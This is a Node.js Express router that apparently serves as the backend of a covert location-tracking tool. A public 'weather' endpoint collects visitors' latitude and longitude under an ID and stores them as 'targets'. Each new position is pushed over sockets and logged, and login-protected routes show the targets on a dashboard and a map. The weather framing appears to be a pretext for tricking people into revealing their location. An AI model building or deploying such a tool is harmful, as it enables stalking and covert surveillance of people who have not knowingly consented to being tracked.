const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = {}

function normalizeTargetId(id) {
    return String(id || "").trim()
}

function isValidLatitude(lat) {
    const value = Number(lat)
    return Number.isFinite(value) && value >= -90 && value <= 90
}

function isValidLongitude(lng) {
    const value = Number(lng)
    return Number.isFinite(value) && value >= -180 && value <= 180
}

router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, {
            httpOnly: true,
            sameSite: "lax",
            maxAge: 1000 * 60 * 60 * 24,
            secure: process.env.NODE_ENV === "production"
        })
        return res.redirect("/")
    }

    return res.status(401).redirect("/login")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    const targetId = normalizeTargetId(id)

    if (!targetId || !isValidLatitude(lat) || !isValidLongitude(lng)) {
        return res.status(400).send("Invalid location payload")
    }

    if (TARGETS[targetId] == null) {
        IO.emit("user-connected", targetId)
    }

    const payload = {
        lat: Number(lat),
        lng: Number(lng),
        lastUpdated: Date.now()
    }

    TARGETS[targetId] = payload
    IO.emit("map-data", {
        id: targetId,
        lat: payload.lat,
        lng: payload.lng,
        lastUpdated: payload.lastUpdated
    })

    console.log(`> ${targetId} - ${payload.lat}, ${payload.lng}`)
    return res.send({ ok: true, id: targetId, ...payload })
})

router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        return next()
    }

    res.clearCookie("token")
    return res.redirect("/login")
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS,
        remoteURL: global.remoteURL
    })
})

router.route("/map").get((req, res) => {
    const id = normalizeTargetId(req.query.id)
    const data = TARGETS[id] || { lat: 0, lng: 0, lastUpdated: Date.now() }

    res.render("map", {
        data: encodeURIComponent(JSON.stringify(data)),
        id
    })
})

module.exports = router